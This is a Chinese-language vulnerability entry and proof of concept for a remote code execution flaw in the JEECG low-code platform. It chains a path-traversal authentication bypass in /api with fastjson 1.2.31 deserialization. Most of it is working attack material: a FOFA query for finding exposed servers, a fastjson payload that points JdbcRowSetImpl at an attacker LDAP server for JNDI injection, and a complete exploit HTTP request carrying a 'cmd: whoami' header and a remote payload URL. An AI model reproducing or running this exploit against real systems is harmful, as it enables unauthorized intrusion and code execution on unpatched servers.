## Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞

Jeecg (J2EE C ode G eneration)是一款基于代码生成器的低代码开发平台, 使用 JEECG 可以简单快速地开发出企业级的 Web 应用系统。目前官方已停 止维护。 JEECG 4.0 及之前版本中，由于 /api 接口鉴权时未过滤路径遍历，攻击 者可构造包含 ../ 的 url 绕过鉴权。

因为依赖 1.2.31 版本的 fastjson， 该版本存在反序列化漏洞。攻击者可对 /api/../jeecgFormDemoController.do?interfaceTest 接口进行 jndi 注入攻 击实现远程代码执行



## fofa

```
app="JEECG"
```

## poc

创建如下远程文件，其内容为fastjson代码执行的payload

```
        {
            "a":{
                "@type":"java.lang.Class",
                "val":"com.sun.rowset.JdbcRowSetImpl"
            },
            "b":{
                "@type":"com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName":"ldap://10.66.64.89:1389/8orsiq",
                "autoCommit":true
            }
        }
```

```
POST /api/../jeecgFormDemoController.do?interfaceTest= HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
cmd: whoami
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 77

serverUrl=http://xxxxxxxx:8877/jeecg.txt&requestBody=1&requestMethod=GET
```

![image-20240526195416290](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405261954336.png)

![image-20240526195357757](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405261953813.png)